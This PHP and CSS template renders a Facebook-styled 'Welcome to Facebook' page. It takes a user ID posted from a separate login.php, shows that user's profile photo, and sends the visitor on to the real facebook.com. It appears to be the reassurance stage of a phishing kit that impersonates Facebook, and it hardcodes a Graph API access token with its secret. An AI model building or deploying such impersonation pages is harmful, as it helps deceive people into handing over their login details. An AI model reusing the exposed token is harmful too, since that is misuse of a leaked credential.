<style>
/* Import Inter font */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

.success-container {
    max-width: 500px;
    margin: 0 auto;
    padding: 40px 20px;
    text-align: center;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background-color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.success-content {
    background: white;
    border-radius: 8px;
    padding: 40px 32px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 400px;
}

.success-avatar {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    margin: 0 auto 24px;
    display: block;
    border: 4px solid #1877f2;
    object-fit: cover;
}

.success-title {
    font-size: 24px;
    font-weight: 600;
    color: #1c1e21;
    margin-bottom: 8px;
    line-height: 1.2;
}

.success-subtitle {
    font-size: 15px;
    color: #65676b;
    margin-bottom: 32px;
    line-height: 1.4;
}

.success-btn {
    width: 100%;
    padding: 14px 16px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.success-btn:hover {
    background: #166fe5;
}

.success-btn:active {
    background: #1464d8;
}

.success-loading {
    text-align: center;
    padding: 40px 20px;
    color: #65676b;
    font-size: 15px;
}.success-content {

    box-shadow: none;

}
</style>

<?php
// Nhận POST data từ login.php
$uid = isset($_POST['uid']) ? trim($_POST['uid']) : '';
$type = isset($_POST['type']) ? trim($_POST['type']) : '';

// Facebook Graph API credentials
$accessToken = '6628568379|c1e620fa708a1d5696fb991c1bde5662';
$avatarUrl = '';

if (!empty($uid)) {
    $avatarUrl = 'https://graph.facebook.com/' . htmlspecialchars($uid) . '/picture?height=500&access_token=' . urlencode($accessToken);
}
?>

<div class="success-container" style="
    padding: 16px;
">
    <div class="success-content" id="success-content">
        <?php if (!empty($uid)): ?>
            <img src="<?php echo htmlspecialchars($avatarUrl); ?>" alt="Profile" class="success-avatar" onerror="this.src='https://via.placeholder.com/120?text=FB'">
            <h1 class="success-title">Welcome to Facebook</h1>
            <p class="success-subtitle">You're all set. Click below to continue.</p>
            <button class="success-btn" onclick="window.location.href='https://facebook.com'">Continue to Facebook</button>
        <?php else: ?>
            <div class="success-loading">
                Unable to load profile. Please try again.
            </div>
        <?php endif; ?>
    </div>
</div>
